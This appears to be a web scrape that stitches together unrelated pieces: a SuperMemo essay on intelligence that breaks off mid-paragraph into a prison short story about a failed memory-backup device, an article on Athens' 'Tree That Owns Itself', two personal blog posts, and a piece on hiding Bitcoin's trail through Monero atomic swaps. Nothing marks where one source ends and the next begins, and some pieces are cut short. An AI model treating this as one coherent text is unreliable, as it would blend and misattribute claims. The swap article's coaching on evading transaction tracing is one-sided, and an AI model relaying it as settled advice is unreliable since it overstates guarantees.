</p><p>Human intelligence has self-amplifying powers that may be undercut (1) internally by a pathology (or aging), or (2) externally by limits on freedom, esp. <a href="https://supermemo.guru/wiki/Free_learning" title="Free learning">freedom of learning</a> (e.g. <a href="https://supermemo.guru/wiki/Schooling" title="Schooling">schooling</a>).
</p>
<h2><span id="Universal_intelligence_is_elusive">Universal intelligence is elusive</span></h2>
<p>In healthy adults, intelligence is a domain-specific problem solving capacity. The concept of innate universal intelligence is a myth. A highly knowledgeable individual may show a spark of genius across many domains and come close to the sense of universal intelligence. We may use the term, a <b>Renaissance (wo)man</b> or a <b>polymath</b> in reference to such a person. Wide learning may provide an illusion of universal intelligence. This seemingly universal intelligence often runs in families. This may be explained by family culture, personality traits, and only to a minor degree by genes associated with the actual processing power of the brain.
</p><p>As much as there is no universal intelligence, there is no universal IQ test. All tests will depend on prior knowledge, interests, exposure, culture and other biases. Howard Gardner proposed the concept of <a href="https://en.wikipedia.org/wiki/Theory_of_multiple_intelligences">multiple intelligences</a>, where neurophysiological modalities may determine a preference for a specific type of cognitive processing. His thinking can be extended to all aspects of human knowledge where domain-specific training leads to the <a href="https://supermemo.guru/wiki/Emergence" title="Emergence">emergence</a> of domain-specific intelligence. In other words, there are as many intelligences as there are intelligent human brains. Correlations that lead to the concept of <a href="https://en.wikipedia.org/wiki/G_factor_(psychometrics)"><i>g factor</i></a> are all rooted in cross-domain transfers (e.g. in a set of positive feedback loops, learning may affect sleep, circulation, neurogenesis, mood, etc.).
</p><p>As much as there is no universal problem solving capacity, there is no universal problem solving test (see: <a href="https://supermemo.guru/wiki/PISA_fuels_the_education_arms_race" title="PISA fuels the education arms race">PISA refocuses on problem solving</a>). This extends to artificial intelligence. We cannot dismiss a state-of-the-art system on the grounds that <i>"all it can do is play Go"</i>. It is true that we still struggle to produce an artificially intelligent system that would show universal <a href="https://supermemo.guru/wiki/Learn_drive" title="Learn drive">learn drive</a> sufficient for the <a href="https://supermemo.guru/wiki/Emergence" title="Emergence">emergence</a> of highly applicable <a href="https://supermemo.guru/wiki/Abstract_knowledge" title="Abstract knowledge">abstract knowledge</a> when immersed in any domain. However, once we arrive there, we will still need to train the system in specific domains to call it truly intelligent.
</p>
<h2><span id="How_does_aging_affect_intelligence.3F">How does aging affect intelligence?</span></h2>
<p>In a healthy adult, domain-specific problem solving capacity will usually follow a curve in which there is an ascent in youth and a decline at older ages. The shape of that curve is determined by the balance of gains and losses. Gains are usually associated with learning, esp. learning via problem solving. Losses are mostly associated with health, esp. metal health, or neglect. As intelligence is a self-perpetuating quality, those who gain intelligence early may continue thriving into a very old age. On rare occasions, the effects of aging can be entirely compensated by lifelong learning, even in <a href="https://supermemo.guru/wiki/How_fast_does_memory_decline_with_age%3F" title="How fast does memory decline with age?">octogenarians and beyond</a>.
</p>
<h2><span id="Intelligence_prescription">Intelligence prescription</span></h2>
<p>The above reasoning leads to a simple formula for high intelligence:
</p>
<p>To maximize intelligence, we should focus on maximizing the acquisition of <a href="https://supermemo.guru/wiki/Abstract_knowledge" title="Abstract knowledge">high-quality knowledge</a></p>
<p>The term <i>high quality</i> stands here primarily for <a href="https://supermemo.guru/wiki/Coherence" title="Coherence">coherence</a> and <a href="https://supermemo.guru/wiki/Applicability" title="Applicability">applicability</a> (see: <a href="https://supermemo.guru/wiki/Abstract_knowledge" title="Abstract knowledge">Abstract knowledge</a>).
</p><p>The above formula is universal and hermetic. It dispenses of the problem of the starting point, which will often differ vastly between individuals. It carries an important optimistic message that accelerates progress: <b>there are few innate obstacles to high intelligence</b>.
</p>
<h2><span id="How_can_we_make_populations_more_intelligent.3F">How can we make populations more intelligent?</span></h2>
<p>Immense progress could be achieved if adults could eliminate only two factors: (1) <a href="https://supermemo.guru/wiki/Stress_resilience" title="Stress resilience">stress</a> and (2) <a href="https://supermemo.guru/wiki/Science_of_sleep" title="Science of sleep">sleep</a> problems. As personality traits are set, escaping from toxic human environments may also play a role for a large proportion of the population. Millions of people fail to live up to their potential due to being suppressed by their work environment or even family. Work environments must be friendly and families must thrive on love. Without those preconditions, achieving high intelligence is difficult. The balance of gains and losses may be negative or insufficiently positive. In addition, for a large proportion of children, the chances for growth are stunted by <a href="https://supermemo.guru/wiki/Schooling" title="Schooling">schooling</a>. Schools often promote bad learning habits, loss of self-reliance and unhealthy social environments. One of the best predictors of future high intelligence is a well-established and intense <a href="https://supermemo.guru/wiki/Passion_and_memory" title="Passion and memory">childhood passion</a>.
</p><p>There is nothing wrong with striving at genius. See my <a href="https://supermemo.guru/wiki/Genius_checklist" title="Genius checklist">Genius checklist</a> for some hints. In short, if you are unhesitantly involved in passionate problem solving associated with perpetual learning, you can rest assured: you are on the ascending curve towards high intelligence. All you need to remember is to shelter your efforts from possible disruptions to this self-empowering status quo.
</p>
<h2><span id="Intelligence_vs._knowledge">Intelligence vs. knowledge</span></h2>
<p>Stable knowledge and new knowledge play key roles in intelligence. For details see: <a href="https://supermemo.guru/wiki/Knowledge_in_creative_problem_solving" title="Knowledge in creative problem solving">Knowledge in creative problem solving</a>.

<blockquote><i><b>Figure:</b> Creative problem solving requires (1) vast expert knowledge of high <a href="https://supermemo.guru/wiki/Stability" title="Stability">stability</a>, and (2) rich new knowledge of high <a href="https://supermemo.guru/wiki/Retrievability" title="Retrievability">retrievability</a>. Vast stable knowledge makes it easy to solve algorithmic problems. Those problems can be solved at low energy expenditure with the help of <a href="https://supermemo.guru/wiki/Fast_thinking" title="Fast thinking">fast thinking</a>. Problems that require "thinking out of the box" rely on <a href="https://supermemo.guru/wiki/Creativity" title="Creativity">creativity</a>, i.e. association of remote ideas. Creativity and <a href="https://supermemo.guru/wiki/Learn_drive" title="Learn drive">learn drive</a> are powered by "hungry knowledge", i.e. fresh knowledge that can easily be molded and <a href="https://supermemo.guru/wiki/Generalization" title="Generalization">generalized</a> via <a href="https://supermemo.guru/wiki/Forgetting" title="Forgetting">forgetting</a>. This plasticity provides for good pattern matching in new learning and in creative problem solving</i></blockquote>

To think that others now thought I was a dangerous criminal as well was unsettling. The first person who died after I arrived at the ‘Correctional Institution’ was a 49-year-old Chinese-American named Li Wei. She had been there for 21 years for killing her teacher and would probably have been there for more but she had given up her right to appeal and had requested execution. After the initial shock had passed, I tried staying away from the other inmates. Forming attachments in a prison wasn’t a good idea. The way I saw it, they could be executed at any time.</p><p>“Count time. Turn the light on and stand at the door.” The loudspeakers came on as usual at 6 a.m. A few minutes later, breakfast trays were handed through the bars of the cell doors.</p><p>Today I was allowed in the unit’s law library. The two hours were never enough to gather enough information. Searching through the legal databases sitting in a cubicle using an old-fashioned computer from the year 2020 was enough to give anyone a headache and I was nowhere near prepared for my appeal hearings. When the two hours were up, I was led to my cell. What I wouldn’t do to get my old life back.</p><p>It was difficult to grasp how I had gone from being a bookworm holed in my apartment 24/7 to being accused of murdering a police officer. It would be years before I was proven innocent and another year before I was let out. To think I got here because of a glitch in the system’s face recognition system. They were willing to let a young innocent girl die rather than admit that there was something wrong with their technology. Having been here a month already and nowhere close to gathering enough information to prove my innocence, I had lost faith in God and the system. I had resigned myself to this cruel fate that God had handed me in a battered and dented platter.</p><p><em>Please let me find something to prove my innocence.</em></p><p>God must have heard my prayers because two days later members from the SCITECH arrived promptly at 11 in the afternoon.</p><p>Hearing the whispers from the others, I had already gathered that they were here to find volunteers to try out their newest technology because who better to try out your newest ‘technology’ on than the prisoners who had appealed for execution. Even if something went wrong, they would die anyway. If the technology worked, it’s all the better for them. We were nothing but <em>lab rats</em> to them. My lips curled in distaste. I wasn’t interested in being a lab rat. The technology wasn’t something you could rely on 100%. My current situation was a testament to that.</p><p>They were rounding the halls twisting their words to gather volunteers. I had lost interest in them and was playing chess by myself until they stood in front of my cell. There were three of them. The one in the middle seemed like he was the spokesperson. The other two were murmuring in the background.</p><p>“As you may have already gathered — ”</p><p>“Not interested.” I interrupted. He looked shocked as if a prisoner would dare to interrupt him while he was speaking. I couldn’t care less if he was offended.</p><p>“It could help you clear your name.”</p><p>I slowly turned my head to the side. It was one of the guys that had been murmuring in the background before. But his words caught my attention.</p><p>“Excuse me? Clear my name? Exactly what is it that you want to test?”</p><p>I should have known better than to meddle with technology after everything that happened. But proving my innocence by becoming a lab rat seemed like a sweet deal at the time. But I was wrong like I had been wrong about everything else in my life.</p><p>10 minutes.</p><p>That’s all the time I have. 10 minutes until I lose the remaining of my memories. Until I lose myself. Until I rid myself of this pain.</p><p>Until I die.</p><p>600 seconds.</p><p>599…598…597…</p><p>Memories were supposed to last forever. Even when the moment had long passed and the tears had long dried. Even when the jokes were long said and laughter had long faded. But fate had dealt me with a cruel hand. It had left me with a fragment of my soul.</p><p>555…554…553…</p><p>The technology was supposed to have worked. Instead, M-mry had backfired. The device itself was small and the process simple. Put on the small headset that came with a remote-like device. Type in the year and select what you wanted to backup. I had chosen high school because I didn’t have fond memories of that time. Instead of backing my memories up, it had deleted it from the main server. From my brain, it had stolen 4 years of my precious memories. Ones that I would never get back. Rafe had promised it would work but of course, he had lied. After he had seen the initial interest and curiosity in my eyes, he had used everything and said everything he could to get me to volunteer. And like a desperate idiot I was, I had believed every word he had said about how M-mry would free me by proving my innocence. I could remember every word he had said he was watching me with his chips blue eyes unwaveringly whenever he spoke.</p><p>“<em>The technology is new and it’s the prototype but we are sure that it works. Simply put, it’s a way to back up your memory. If it works, your ideas would not be lost even when you died. If you suddenly had Alzheimer’s disease, then you would still have a way to access your memories. Hypothetically, M-mry could prove your innocence by looking through your memories.</em>”</p><p>And when I had been unsure and close to backing out, he had used the one thing that was most important to me: My family.</p><p>“<em>M-mry is your only hope of proving your innocence. If it works, you will able to leave and see your family whenever you want. You could hug them and live freely. Be able to marry and have kids one day. Otherwise, who knows, maybe even in 20 years you will still not have proved your innocence.</em>”</p><p>That had been enough for me to sign my name on the thick document that protected SCITECH in case something did go wrong. And something went wrong indeed. Not only had I lost my memories of high school but now I had no way of getting them back.</p><p>480…479…478…</p><p>I didn’t think the memories I thought useless and unimportant when forgotten would feel as if I had lost a piece of my soul.</p><p>460…459…458…</p><p>Two weeks ago I gave up my right to appeal and asked for my execution. The new memories living in this prison would never replace the old memories and I was never going to get out of here even if I stayed here 40 years being on my best behavior.</p><p>355…354…353…</p><p>I never thought I would end up here.</p><p>250…249…248..</p><p>With the barest of memories.</p><p>110…109…108..</p><p>I thought that when I died, I would at least die as myself.</p><p>30…29…28…</p><p>I didn’t think I would die a shadow of my former self.</p><p>10…9…8…</p><p>I didn’t think I would die, a stranger.</p><p>3…</p><hr><p><em>Edited by <a href="https://instagram.com/cherrywine_stains" title="Mrk (cherrywine_stains) Instagram Profile" rel="nofollow">cherrywine_stains</a></em></p></div></div>]]>

		<p>No matter how famous or how ancient, all trees are ultimately owned by someone. It could be a government, a trust, or even just an individual caretaker. However, one white oak tree in Athens, Georgia was reportedly so beloved by its owner that upon his death, he gave the tree ownership of itself in his will.<span id="more-2706"></span></p>
<h2>The Legend of the Tree That Owns Itself</h2>
<p>The legend goes that a particularly large and beautiful white oak played a special role in the childhood of its owner, Colonel William Henry Jackson. When he died some time between 1820 and 1832, he deeded the tree and the soil around it to the tree itself. Here is the reported text of his will:</p>
<blockquote><p>I, W. H. Jackson, of the county of Clarke, of the one part, and the oak tree&nbsp;… of the county of Clarke, of the other part: Witnesseth, That the said W. H. Jackson for and in consideration of the great affection which he bears said tree, and his great desire to see it protected has conveyed, and by these presents do convey unto the said oak tree entire possession of itself and of all land within eight feet [2.4 m] of it on all sides.</p></blockquote>

<p>After that, the tree become known as the Tree that Owns Itself. However, there are a number of problems with the story’s validity. It originally ran as a front page story in the <em>Athens Banner Weekly</em> on August 12, 1890. That’s some 60 years after the supposed transaction took place, and there are no indications that anything special had happened to the tree before that (although it was known as Jackson’s Tree).</p>
<p>On top of that, the only witness to the will itself is the author of the article, and no one has been able to confirm that the statement above was ever made. However, the story became so popular that no one dared doubt the tree’s self-ownership. Effectively, the tree owned itself because everyone said it did.</p>
<p>Legally, of course, the tree isn’t able to own itself regardless of Jackson’s wishes. In fact, careful examination of property lines reveals that the tree isn’t even on his property. It’s officially part of the street (since it’s part of a median in the middle of the street), so its care falls to local authorities.</p>
<p>However, the tree is such a well respected landmark in the city that the Athens-Clarke County government has declared that in spite of the actual legality, the tree owns itself. Because they said so.</p>

<h2>Can a tree have rights?</h2>
<p>It might seem strange that a tree can own anything, let alone itself, but there is actually some legal precedent. Although they usually take a back seat to animal rights, plant rights have been discussed in several countries around the world.</p>
<p>In the Netherlands, a party called <a href="https://in.reuters.com/article/us-dutch-election-plants/plant-rights-party-to-contest-next-dutch-election-idINTRE62S2HA20100329">the Party for the Plants</a> was created to try to snag a few seats in the 2010 parliamentary elections. Although they weren’t particularly successful, their platform focused exclusively on promoting biodiversity and protecting plants from being harvested for biofuels.</p>
<p>More success has been found in New Zealand, where for the first time anywhere a forest was granted legal personhood and ownership of itself. The&nbsp;Te Urewera Act of 2014 changed the legal status of Te Urewera, a forest sacred to the Maori people, from a Natural Park into <a href="http://maorilawreview.co.nz/2014/10/tuhoe-crown-settlement-te-urewera-act-2014/">its own legal entity</a>.</p>

<p>Obviously the forest can’t speak for itself, so a board was set up “to act on behalf of, and in the name of, Te Urewera”. In March 2017 a second act was passed granting similar rights to the Whanganui River, since the local Maori tribe consider the river itself to be their ancestor.</p>
<p>Although it doesn’t go as far as giving trees and other plants ownership of themselves, the Clean Water Act of 1972 in the United States effectively grants them some rights. Under the ‘natural resource damage’ provisions of the law, trees and other resources have some basic rights. It’s the government, however, that’s entrusted with protecting those rights, although any money earned through litigation must be spent on the resource itself. Essentially, the money <em>belongs</em> to the resource.</p>
<h2>The Son of The Tree That Owns Itself</h2>
<p>The Tree That Owns Itself might have been granted semi-legal status in Athens-Clarke County, but that didn’t protect it from the whims of Mother Nature. It was heavily damaged in an ice storm in 1907, and eventually fell down in 1942. Many suspected that the tree had died long before falling.</p>
<p>But if the tree owned land, surely it must pass on to its next of kin. A tree grown from an acorn of the Tree That Owns Itself was selected as the heir, an transplanted into its new home in 1946. It also inherited the name, although it’s also referred to as the Son of the Tree That Owns Itself.</p>

<p>It’s now been more than 70 years since the tree moved in to the quiet residential neighborhood on Finley Street, and it appears to be doing well. Despite its unknown legal status, the legend lives on with a plaque commemorating the words that started it all. Slightly edited to be more intelligible to modern readers, it reads:</p>
<blockquote><p>For and in consideration of the great love I bear this tree and the and the great desire I have for its protection for all time, I convey entire possession of itself and all land within eight feed of the tree on all sides<br>
-William M Jackson</p></blockquote>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Last friday added another count to the yearly event we celebrate as “birthday”. I can barely remember my last birthday, I’m not a big birthday celebration person. I think every day can be a celebration if you choose it to be and a yearly event is not sufficient reason to treat yourself.<br></p><p>The passage of time seems to have changed over the years. Things move by at light speed, and if I blink I miss it. It doesn’t feel like a lot happened, and yet if I sit down and think about my last 1 year, a LOT has happened.</p><p>As I was reminiscing, I went beyond the last 1 year and thought generally of the value system that governs my life. These things come “obviously” to me and they’ve made my life better. I hope these values can serve you as well.</p><h3>1. Fixed vs Growth mindset</h3><p>If you’re anything like me from a few years ago, whenever someone would tell you a way to improve yourself or your life, your default reaction would be “yeah yeah but my life is hard I have X Y and Z reasons why I cannot do something about it”. </p><p>That’s fixed mindset. It’s when your mind operates under the base assumption that you, your situation, your surroundings, and your abilities, everything is static and fixed.</p><p>On the opposite end of the same spectrum is Growth mindset. Here, your mind knows and believes that everything is a work in progress, everything can be changed, and the path to changing something about your life that you don’t completely like is a path of fulfilment, not pain that you want to ignore.</p><p>A fixed mindset plateaus. A person with growth mindset improves and grows, a tiny bit, everyday and forever. </p><h3>2. Complaining drags you down, think problem-solutions instead</h3><p>I could complain about all the problems in my life, or I could list them down, write their probable cause, probable solutions, and the gaps in my knowledge that I need to fill with research to better understand the problem and find better solutions.</p><p>The energy that is used in complaining can be applied towards finding solutions. Not only do you not feel like shit, solving a problem is a positive experience and gives you the sense of control over your life vs submitting to “my life is so hard and the universe is out to get me”.</p><p>Sankalp was watching Mirzapur and shared this with me last night - </p><p><em>“I was watching Mirzapur today. There was a scene where the dons primary gun factory is burnt down to the ground by his rival. </em></p><p><em>He arrives at the scene, calmly guages the situation, then calls the CM who is one of his allies and tells him to release a press statement that the govt has tracked down a gun factory run by a criminal org, burnt it and put all the perpetrators in jail thereby making the state a safer place for everyone and uplift the party's image.”</em><br></p><h3>3. 0 or 1, choices are binary</h3><p>Most of the things in life are an either or. You either got up early today, or you didn’t. You either hit the gym, or you didn’t. </p><p>You could spend a lot of time in analysis of the gray area in between, but it’s a wasted effort on aspects of your life that operate like a transistor.It’s either 0 or 1, switched off or on.</p><p>Identify binary choices in your life and make them swiftly.<br></p><h3>4. Everything is on a spectrum</h3><p>At the same time, a lot of things in life are indeed in the gray area. These don’t have easy choices with clear outcomes, and yet you have to identify the spectrum and decide where you want to be on it in order to move ahead.</p><p>Hitting the gym is binary, how intensely you work out is on a spectrum.</p><p>Choosing to start a business is binary, how risky a path you pick lies on a spectrum.<br></p><h3>5. via negativa. Addition by subtraction</h3><p>The solution to most problems is not to add something, but to remove.</p><p>Not able to lose weight? You can exercise more, or you could eat less. You don’t need to add a night time meditation routine, you only need to remove your laptop and phone from the room.</p><p>A lot of pain in life can be prevented by “avoiding” doing things.<br></p><h3>6. Inversion, or how not to do</h3><p>Here’s a simple mental model that can make your life easier to navigate. Instead of looking for “how to be a good boss”, invert the question. </p><p>Identify instead the reasons that come up when you research “how to be a bad boss”. Apply via negativa, by avoiding the attributes of a bad boss you already become a good one. </p><p>I did the same when I had taken up my last PM job, by making a list of “how to be a bad product manager” and then avoiding those things. </p><p>Sankalp and I did the same when we were hiring by researching “mistakes to avoid when hiring”.<br></p><h3>7. Common sense is not common practice</h3><p>You might think something is obvious and also common sense, but I’ve learnt that there’s a reason many things are tagged as “common sense”. The phrase is an attribute that is desirable, but not necessarily literal. </p><p>Everyone knows eating greasy food in the long term will cause heart disease. Or not hitting the gym or exercising will make your body old and creaky and unfit. It’s common sense. But, not common practice.</p><p>The most important things in life are the simple and obvious ones. And yet they are the hardest to keep following day in and day out. <br></p><h3>8. Time and energy are finite resources</h3><p>The only finite resource in your life is time and energy. And every day, you have a finite amount available to you to apply to various things. Choose carefully.<br></p><h3>9. Velocity, not speed</h3><p>I refer to this over the more commonly referred hard work vs smart work analogy.</p><p>You could be running at a 100 miles/hour but getting no where if you’re moving in circles. Speed. </p><p>Your direction, where you are headed, is more important. Only by moving in the right direction do you make real progress. Velocity.<br></p><h3>10. Treat others the way you would want to be treated</h3><p>Another of the common sense not common practice terms. It’s easy to complain about others when they treat you unfairly. Yet when the power dynamics are reversed, people often do the same treatment to others.</p><p>The real test is how you treat others when you are in a position of power.<br></p><h3>11. People don’t know what they really want</h3><p>Nobody really does. The pursuit of meaning can end with the sharp knife of nihilism. There is no meaning or purpose in life.</p><p>But while having these thoughts are crucial to self-discovery, they aren’t helpful to fixate upon.</p><p>So people create meaning, direction, structures around their life to add meaning and purpose.</p><p>Which is why I think nobody really knows what they want. It’s all made up anyway.<br></p><h3>12. Your health can’t wait</h3><p>The truth is, every day our bodies are getting slightly older.</p><p>And after 25 things start moving faster. I bet they move even faster after 30 or later. Save yourself the trouble and maintain your body from before.</p><p>It makes it that much easier to get out of bed every day, have the energy to do all the things you want during the day, and just generally feel good.<br></p><h3>13. What you eat is what your body becomes</h3><p>The food you eat literally becomes molecules in your body.</p><p>One of the simplest ways to maintain health is by focusing on your eating.</p><p>It’s fascinating to me that we eat 3-6 times/day, and yet very few people spend any time or mental bandwidth understanding food, nutrition and its role in how it shapes our body.</p><p>There are simple heuristics that can go a long way - eating fats doesn’t make you fat, sugar is a carb that affects your body similar to how alcohol does, fasting has marvellous effects on your body, the mantra for weight loss is calories in calories out, the mantra for muscle gain is reps and protein intake.<br></p><h3>14. The information you consume is what your mind becomes</h3><p>If the food you eat becomes your body, then the information you consume becomes your mind. Protect your mind as if it’s your most precious resource (it is), by filtering the sources of information that you let influence you. Even your Twitter feed is programming your subconscious without you realising it.<br></p><h3>15. How you think governs everything in your life</h3><p>If you really think about it, how you think governs your whole life.</p><p>What you eat, whether you exercise, who you date, how you treat relationships, how you learn something new, how you deal with adversity, how you treat others when you are in a position of power, how you spend your free time, how you build your business.</p><p>Everything steps from the root of your thought process, how you think.</p><p>I spent an insane amount of time in 2017-18 deliberately trying to understand my thought patterns, why I think and do the way I do, how do I actually want to be, what should I change and what should I double down upon.</p><p>You can try to do this by reading books, but the best answers will come through developing high self-awareness and doing deep self-introspection.<br></p><h3>16. Generalist skillset is a Swiss knife</h3><p>Over the past few years, I’ve followed a simple mantra to learn whatever hard or soft skills can improve my skill tree required to build successful businesses.</p><p>I visualise it like the skill tree in an RPG game. You can’t unlock and master all branches, so you have to be selective in nurturing the right set of skills.</p><p>Thanks to this mindset, I learnt how to think about product, learnt how to design, simple coding but more importantly understanding the fundamentals of tech, and now I’m learning to become a great marketer.</p><p>This Swiss Army knife is what helps me understand and imagine better ways to achieve the goals we have set to build DelightChat.</p><p>And this doesn’t just apply to entrepreneurs.</p><p>If you’re a designer, you need to understand product management and technology to understand how design fits in between.</p><p>If you’re a marketer, you need to know how to write copy or design creatives or build landing pages in addition to coming up with a marketing strategy.<br></p><h3>17. The real meta-skill is the ability to learn</h3><p>And during this journey I realised that the actual ability isn’t being able to design, or manage product, or write great copy. The real meta-skill is the ability to learn new skills as they become important in your journey. <br></p><h3>18. Don’t chase people, become valuable instead</h3><p>Whenever a friend asks me “How do I make her like me?” or similar question, my answer …</p></div></div>

October 24, 2020 | https://www.sankalpjonna.com/posts/a-blog-post-about-nothing | <a href="https://web.archive.org/web/*/https://www.sankalpjonna.com/posts/a-blog-post-about-nothing">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>A couple of weeks ago, me and my team made a pact that each of us will write something every weekend. What we write about depends on what influenced the individual during that week that was worth sharing with the world.<br></p><p>As it turns out, my job is to write software and most of my time during the week is spent on solving technical challenges. Sometimes I can write about these challenges and how I solved them, but sometimes I can’t because we are too early in our journey of building <a href="https://www.delightchat.io/" target="_blank">delightchat.io</a> to be able to make our core architecture decisions public. <br></p><p>So what do I write this week that will help folks reading it learn something? Here is a radical thought - what if I write about something that doesn’t have any lesson at all? Does good content always need a theme and an underlying concept that helps somebody do something better?<br></p><h3><strong>Seinfeld - a show about nothing</strong><br></h3><p>For those who are not familiar, Seinfeld was a very popular sitcom that aired from the early 90s to the late 90s and it is generally referred to as “a show about nothing”. <br></p><p>This is only a half truth because Seinfeld is actually a very well written show with intricate plots that seem random at first but tie up pretty smoothly towards the end of an episode. The real reason it is a show about nothing is because unlike other sitcoms, the episodes do not have a theme. &nbsp;There is no lesson that the characters learn and evolve as human beings, there is no hidden metaphor that teaches you morals and values of how to navigate life.<br></p><p>The show instead focuses on whimsical scenarios that the characters face as a result of being selfish and inconsiderate. The episodes involve characters getting into conflicts during their day to day interactions with friends and family and how they handle the conflict while learning absolutely nothing in the process.<br></p><h3><strong>Why I think this is important</strong><br></h3><p>Despite everything you just read about Seinfeld, this was one of the most if not the most wildly successful sitcoms of all time and every sitcom since Seinfeld tries to embody some aspect of this in their plots. If not in the main plot there are sub plots which are about people screwing up and learning nothing. And this is for the simple reason that the show was very entertaining.<br></p><p>Sometimes all we really need in life is a creative way to pass the time. We are not in a race to constantly better ourselves, become the post possible version of ourselves, learn new things and kill it in life every single day. Some days are just slow and unproductive. And these days matter because otherwise how do we value the days where we do kill it in life?<br></p><p>We are fed this notion that everyone needs to chase a goal in life and every single day must be an attempt to get one step closer to that goal. For the record, I do think we should all have something that drives us and fuels the machine that keeps us going in life, but this doesn’t mean that the machine can’t rest and do nothing once in a while. <br></p><h3><strong>Life is long</strong><br></h3><p>The phrase “life is short” is quite popular. It is meant teach folks that every day must be lived to the fullest because we are all going to die someday and the last thing we want is to miss out on anything worthwhile.<br></p><p>But if you think about it, unless everyone has a terminal disease or gets into an accident, the average life expectancy of a person is over 70 years. This seems like a long time to be able to live life to the fullest every single day! <br></p><p>Life is long enough to waste a few days on doing nothing and let the brain and the body cool off and blow some steam. Life is long enough to let a few days pass without learning something new or accomplishing something. Life is long enough to waste time reading this article even though it doesn’t teach you anything.<br></p><h3><strong>Why did I write this article?</strong><br></h3><p>If you are still reading this despite me telling you that you will learn nothing from this, it means that you were most likely just browsing the internet while looking for nothing in particular. And that’s why I wrote this article - to help you pass the time and remind you that it is completely okay to do so.<br></p><p>If by any chance you are reading this while sipping your morning coffee or having a meal, or in general while performing a pretty uneventful task, I hope I kept you engaged. This is what Seinfeld did for me.</p></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
          <div><p>Monero cryptographers <a href="https://eprint.iacr.org/2020/1126.pdf" target="_blank" rel="noopener noreferrer">recently discovered</a> how to conduct “atomic swaps” between Bitcoin and Monero. This means that any two people can swap Bitcoin for Monero between them without relying on any third-party service, using only software they run themselves.</p><p>As Monero is the god of privacy coins (and the blockchain <a href="https://icryptonode.com/products/monero-icryptonode-raspberry-pi-device" target="_blank" rel="noopener noreferrer">we develop products for</a>), this naturally led to speculation that this innovation would enable Monero to become a layer-2 privacy solution for bitcoin, which is itself <a href="https://www.chainalysis.com/" target="_blank" rel="noopener noreferrer">notoriously traceable</a>.</p><p>Over the past week I have read all manner of incorrect information from uninformed commenters about if this is possible, how it will work, and what this means for Monero and Bitcoin.</p><p>Let me state clearly -</p></div>

<div><p>But it’s a Yes* (with an asterisk!). Let me explain:</p><p>Bitcoin is a public blockchain - the ledger is entirely open for analysis. This creates a perfect trail of transactions, allowing anyone to see the path of bitcoin from “freshly mined” to person A to B to C and so on. Bitcoin users who wish to maintain privacy have to do additional steps, such as using a mixing-wallet like <a href="https://www.wasabiwallet.io/" target="_blank" rel="noopener noreferrer">Wasabi</a>. Using Wasabi is an imperfect solution, has fees, and requires a relatively large amount of money to use. Another option is to trust a third-party like a centralized exchange. Either way, “breaking the chain” of bitcoin transactions to establish privacy is difficult, expensive, usually involves trusted third-parties, and is not guaranteed to maintain privacy forever as Chainalysis and similar firms become more sophisticated at tracing bitcoin transactions.</p><p>Bitcoin / Monero atomic swaps will establish privacy in a fully decentralized way - one that doesn’t rely on mixing technology or third-party trusted services. The way it will work is thus:</p><p>Alice currently owns bitcoin, but because of blockchain-analysis it’s trivial to know she purchased it at Coinbase. Fearing for her safety from an abusive ex-boyfriend, Chad, who works for the government and has access to Chainalysis software, it’s absolutely essential that Alice hides her bitcoin. Once Alice’s bitcoin is unlinked from her ownership, no one can prove she owns it, thus maintaining her personal safety.</p><p>Alice must do two trades - first, she swaps her bitcoin for an equivalent amount of Monero using an atomic swap and a counterparty she found in a decentralized exchange. She trades 1 BTC for 10 XMR.</p><p>Next, Alice swaps her XMR back to BTC. The market moved against her slightly - she now trades 10 XMR for 0.99 BTC, plus a small amount for network fees. Alice ends up with 0.9895 BTC.</p><p>Now, Alice has bitcoin that cannot be traced to her identity - she “broke the chain” that linked the purchase to her own identity. Alice never had to speak to anyone or trust any third-party service for doing so. She did work with two counterparties (trades from BTC to XMR and then XMR to BTC), but had no knowledge of who they were and never spoke with them, relying on software to conduct the swap peer-to-peer. She could not be scammed - provided she agreed with the trade amounts, it was mathematically impossible for her to lose her money at any step of the way - that’s why this is “trustless”.</p><p>Now, Alice has bitcoin she can save or spend anonymously. If she ever has a reason to anonymize more bitcoin, she can use the same steps to convert unsafe bitcoin to safe bitcoin, using the Monero blockchain as a privacy layer. Her wealth is now safe from Chad, the government rapist.</p></div>
<h2>Risks of Bitcoin to Monero Atomic Swaps</h2>
<div><p>As mentioned previously, <strong>Alice cannot be scammed using atomic swaps</strong>. Mathematics will perfectly protect her from a counterparty that tries to steal her money.</p><p>The biggest risk to Alice comes from <em>time</em> - the longer she waits, the less likely blockchain analysis will be able to track her, but the more likely the price will move against her.</p><p>Why is waiting important? Just like with <a href="https://tornado.cash/" target="_blank" rel="noopener noreferrer">tornado.cash</a>, if Alice were to quickly swap into XMR and back out into BTC, there will likely be few or no swaps other than her’s. This would make it probabilistically quite likely that the second BTC output is Alice’s. Alice should wait for several other swaps to occur before she executes her swap back into BTC.</p><p>Another risk is in the size of outputs. If Alice swaps 9.347 BTC into XMR, then swaps 9.347 back out, it’s highly likely it’s her’s.</p><p>Therefore, Alice should 1) Wait a while holding XMR (hours or days), and 2) make several, staggered transactions back into BTC from XMR. The biggest danger here is the price of Monero moving against Bitcoin, but it will likely be worth it to maintain privacy.</p><p>I anticipate that services will be created that make anonymizing Bitcoin simple and safe using standard output amounts (0.1, 1.0, 10.0 BTC, etc.) similar to tornado.cash.</p><p>One final note - I assume that chain-analysis can determine which bitcoin outputs are used for Monero atomic swaps. Given that the Bitcoin script used for the 2-of-2 Bitcoin locks is extremely specific, I assume that all Bitcoin UTXOs used for Monero swaps will be tracked. If Monero researchers find a way to obfuscate all atomic swap transactions among normal transactions, privacy can be greatly increased. But given the amount of intense research this solution will inevitably attract, it is unlikely “hiding among the crowd” will be possible. This is also why waiting after a swap will be extremely important.</p></div>
<h2>Conclusion</h2>
<p>Monero can indeed be used as a layer-2 privacy solution for Bitcoin. It is not perfect, and risks with timing and transaction size can compromise privacy. But Monero is currently the only trustless, fully-decentralized solution for enhancing privacy on Bitcoin and I anticipate that it will become extremely popular.

